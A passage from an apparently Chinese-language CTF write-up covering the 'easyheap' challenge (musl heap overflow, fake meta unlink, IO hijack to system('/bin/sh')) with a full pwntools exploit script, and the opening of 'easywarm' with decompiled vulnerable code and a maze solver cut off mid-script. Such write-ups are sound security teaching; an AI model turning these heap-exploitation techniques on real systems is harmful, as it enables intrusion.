class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span></span><br><span class="line"><span class="number">0x555555604d20</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0xfffffffd</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前6个数据是输入的 num，第7个数据是计算的结果，第8个数据就是 <code>idx offset</code></li>
</ul>
<p>musl 中的 unlink 依赖与如下的函数，本身缺乏检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>dequeue</code>函数的触发条件如下：</p>
<ul>
<li>队列不能为空</li>
<li>队列的头指针不能为空</li>
<li>队列中至少有一个元素</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>现在有4字节的溢出，可以覆盖 <code>chunk-&gt;idx,offset</code>，不过首先需要利用溢出泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">prepare()</span><br><span class="line">add([<span class="number">0xFFFFFFFF</span>]*<span class="number">20</span>) <span class="comment"># 0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment"># 0</span></span><br><span class="line">exit()</span><br><span class="line">challenge([<span class="number">0x0</span>], <span class="string">&quot;d&quot;</span> * <span class="number">0x18</span>, <span class="literal">True</span>)</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0xb7870</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7ffec78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi <span class="number">0x7ffff7ffec78</span> ◂— <span class="number">0x6464646464646464</span> (<span class="string">&#x27;dddddddd&#x27;</span>)</span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffff7ffec90</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffff7ffeca8</span> —▸ <span class="number">0x7ffff7ffe870</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>由于 meta 所在页与 group 所在页分离，想要伪造 meta，就必须要泄露 secret：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmapg[index] = chunk[num];</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 num 没有限制，因此可以将 heap 上的 secret 写入 mmapg</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prepare()</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#1</span></span><br><span class="line">exit()</span><br><span class="line">challenge([(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1228</span>),(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1221</span>)])</span><br></pre></td></tr></table></figure>
<p>接下来就是布置堆风水，将当前堆块的最后 4 个字节设置为 0xdeadbeef010，通过 4 字节溢出将下一个堆块的 offset 值设置为 0 </p>
<p>释放下一个 chunk，将 meta 劫持到 0xdeadbeef010 处，然后程序会执行 <code>dequeue</code> 将 fake meta unlink，在此处会触发一次 WAA 任意写，我们的目标就是劫持 musl IO 并执行 system</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./easyheap&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1528)\nb *$rebase(0x1AC6)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Code: &quot;</span>,<span class="string">&quot;W31C0M3_to_QWB21&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">nums</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_Cr34t3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;need?&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(nums)))</span><br><span class="line">    <span class="keyword">for</span> idx,n <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">        sla(<span class="string">&quot;num&quot;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, nums</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_M0d1Fy&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;modify?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> idx, n <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">        sla(<span class="string">&quot;num&quot;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_D3l3Te&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;delete?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_G00dBye&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">answers, name=<span class="literal">None</span>, wait=<span class="literal">False</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> ans <span class="keyword">in</span> answers:</span><br><span class="line">        <span class="keyword">if</span> wait:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(ans) == <span class="built_in">int</span>:</span><br><span class="line">            sla(<span class="string">&quot;answer: &quot;</span>, <span class="built_in">str</span>(ans))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hint, nums = ans</span><br><span class="line">            sla(<span class="string">&quot;answer: &quot;</span>, hint)</span><br><span class="line">            <span class="keyword">if</span> hint == <span class="string">&quot;whos_your_daddy&quot;</span>:</span><br><span class="line">                sla(<span class="string">&quot;Input:&quot;</span>, <span class="built_in">str</span>(nums))</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    sla(<span class="string">&quot;name?&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">    sa(<span class="string">&quot;name!&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line">add([<span class="number">0xFFFFFFFF</span>]*<span class="number">20</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#0</span></span><br><span class="line">exit()</span><br><span class="line">challenge([<span class="number">0x0</span>], <span class="string">&quot;d&quot;</span> * <span class="number">0x18</span>, <span class="literal">True</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0xb7870</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#1</span></span><br><span class="line">exit()</span><br><span class="line">challenge([(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1228</span>),(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1221</span>)])</span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add([<span class="number">0x0</span>] * <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, [<span class="number">0</span>] * <span class="number">12</span> + [<span class="number">0xdbeef010</span>, <span class="number">0xdea</span>, <span class="number">0x0</span>])</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x50a90</span></span><br><span class="line">add([<span class="number">0x6e69622f</span>, <span class="number">0x68732f</span>] + [<span class="number">0x0</span>] * <span class="number">8</span> + [<span class="number">0xdeadbeef</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbeefdead</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, system &amp; <span class="number">0xffffffff</span>, system &gt;&gt; <span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add([<span class="number">0x0</span>] * <span class="number">14</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">stdout = libc_base + <span class="number">0xb4280</span></span><br><span class="line">base_address = libc_base + <span class="number">0xb7a90</span></span><br><span class="line">stdout_ptr = system + <span class="number">0x63920</span></span><br><span class="line">fake_chunk = libc_base + <span class="number">0xb7cc0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base_address &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(base_address))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;fake_chunk &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_chunk))</span><br><span class="line">success(<span class="string">&quot;stdout_ptr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stdout_ptr))</span><br><span class="line">success(<span class="string">&quot;break_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base + <span class="number">0x2AB17</span>))</span><br><span class="line"></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_value = (<span class="number">20</span> &lt;&lt; <span class="number">6</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) | <span class="number">1</span> | (<span class="number">0xfff</span> &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">challenge([(<span class="string">&quot;next_next&quot;</span>, <span class="number">0</span>), (<span class="string">&quot;next_next&quot;</span>, <span class="number">0</span>),</span><br><span class="line">           <span class="number">0x0</span>, <span class="number">0x0</span>,</span><br><span class="line">           fake_chunk &amp; <span class="number">0xffffffff</span>, fake_chunk &gt;&gt; <span class="number">32</span>,  <span class="comment"># prev</span></span><br><span class="line">           stdout_ptr &amp; <span class="number">0xffffffff</span>, stdout_ptr &gt;&gt; <span class="number">32</span>,  <span class="comment"># next</span></span><br><span class="line">           base_address &amp; <span class="number">0xffffffff</span>, base_address &gt;&gt; <span class="number">32</span>,  <span class="comment"># group</span></span><br><span class="line">           <span class="number">0x2</span>, <span class="number">0x0</span>,  <span class="comment"># masks</span></span><br><span class="line">           last_value &amp; <span class="number">0xffffffff</span>, last_value &gt;&gt; <span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">prepare()</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">exit()</span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="easywarm"><a href="#easywarm" class="headerlink" title="easywarm"></a>easywarm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">easywarm: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=e708c2433f22dc346ad3b92573800150c429996f, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序总体上是实现了一个走迷宫的小游戏，漏洞比较难找</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sizeg / numg &gt; <span class="number">15</span> &amp;&amp; sizeg / numg &lt;= <span class="number">32</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; sizeg / numg / <span class="number">2</span>; ++i )</span><br><span class="line">    v3 = <span class="number">2</span> * v3 + <span class="number">1</span>;</span><br><span class="line">  v2 = v3 &amp; (<span class="keyword">unsigned</span> __int64)&amp;v2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;flag: %lu\n&quot;</span>, v3 &amp; (<span class="keyword">unsigned</span> __int64)&amp;v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以泄露 stack_addr 的后4位</li>
</ul>
<p>程序设置了一个可疑的中断处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(<span class="number">8</span>, (<span class="keyword">__sighandler_t</span>)hander2);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(*(<span class="keyword">void</span> **)(key_buf.argv + <span class="number">8</span>), <span class="string">&quot;666&quot;</span>, <span class="number">3uLL</span>);</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">readlink(<span class="string">&quot;/proc/self/exe&quot;</span>, s, <span class="number">0xFF</span>uLL);</span><br><span class="line">execve(s, (<span class="keyword">char</span> *<span class="keyword">const</span> *)key_buf.argv, (<span class="keyword">char</span> *<span class="keyword">const</span> *)key_buf.env);</span><br></pre></td></tr></table></figure>
<p>找了半天也没弄懂该如何触发，最后在 nowork 中发现了端倪：（有一个除0操作被优化了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This is a gift for you ^_^ ~&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;# system(\&quot;/aidai/ash\&quot;); exists here.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;# I think you must be able to get flag.&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>另外程序还有一处溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;key_buf, <span class="number">0</span>, sizeg / numg / <span class="number">2</span> + <span class="number">80</span>);</span><br><span class="line">readn(&amp;key_buf, sizeg / numg / <span class="number">2</span> + <span class="number">80</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在 key_buf 中可以溢出2字节</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>为了触发 stack_addr 泄露，必须先解决迷宫问题：</p>
<p>提取迷宫数据时往往会因为单位字符的长度不同而提取出错，这里我选择用正则表达式解决这个问题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maze = []</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    data = ru(<span class="string">&quot;\n&quot;</span>)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">    data = re.sub(<span class="string">&quot;🚩&quot;</span>,<span class="string">&quot;7&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;👴&quot;</span>,<span class="string">&quot;3&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;  &quot;</span>,<span class="string">&quot;1&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;██&quot;</span>,<span class="string">&quot;0&quot;</span>,data)</span><br><span class="line">    maze.append(data)</span><br></pre></td></tr></table></figure>
<p>走迷宫的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">v</span>):</span></span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])] + v + [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])]</span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> + i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line">    v = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line"></span><br><span class="line">    x0, y0 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                x0, y0 = x, y</span><br><span class="line">    v[x0][y0] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    ans = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">ans, v, x, y</span>):</span></span><br><span class="line">        <span 